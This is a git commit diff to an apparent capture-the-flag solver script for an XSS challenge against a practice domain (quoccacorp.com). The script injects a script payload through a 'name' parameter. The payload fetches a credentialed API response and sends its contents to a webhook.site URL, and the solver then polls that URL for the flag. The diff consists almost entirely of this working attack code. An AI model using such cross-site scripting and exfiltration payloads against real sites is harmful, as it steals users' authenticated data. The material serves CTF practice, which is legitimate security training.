ac60e1ccd18a67a9158aa21a6aa7beb4563221a7
SAW <99191294+nicsaw@users.noreply.github.com>
2025-04-07 21:08:36 +1000

    style

--- ctf/4-XSS/cors_playground.py
+++ ctf/4-XSS/cors_playground.py
@@ -5,6 +5,7 @@ from utils import get_session, find_flag
 
 import json
 import time
+from bs4 import BeautifulSoup
 
 BASE_URL = "https://cors-xss.quoccacorp.com"
 CORS_API_CALLER_URL = "https://cors-api-caller.quoccacorp.com"
@@ -20,7 +21,7 @@ class Solver:
         response = self.session.post("https://webhook.site/token")
         return response.json()["uuid"]
 
-    def find_flag_webhooksite(self, delay_seconds=2):
+    def find_flag_webhooksite(self, delay_seconds=3):
         time.sleep(delay_seconds)
         response = self.session.get(self.webhooksite_requests_url)
         response_json = response.json()
@@ -28,10 +29,18 @@ class Solver:
         find_flag(response_json_text)
 
     def main(self):
+        # response = self.session.get(CORS_API_CALLER_URL)
+        # soup = BeautifulSoup(response.text, "html.parser")
+        # script_element = soup.find("script")
+        # print(script_element)
+
         PAYLOAD = f'''<script>
-fetch("https://cors-api.quoccacorp.com/note?cors-allow-origin={BASE_URL}", {{credentials: "include"}})
+const API = "https://cors-api.quoccacorp.com";
+const MY_ORIGIN = "{BASE_URL}";
+
+fetch(`${{API}}/note?cors-allow-origin=${{encodeURIComponent(MY_ORIGIN)}}`, {{credentials: "include"}})
 .then(response => response.text())
-.then(x => fetch("{self.webhooksite_url}?q=" + x))
+.then(responseText => fetch(`{self.webhooksite_url}?q=${{responseText}}`));
 </script>'''
 
         response = self.session.get(BASE_URL, params={"name": PAYLOAD})
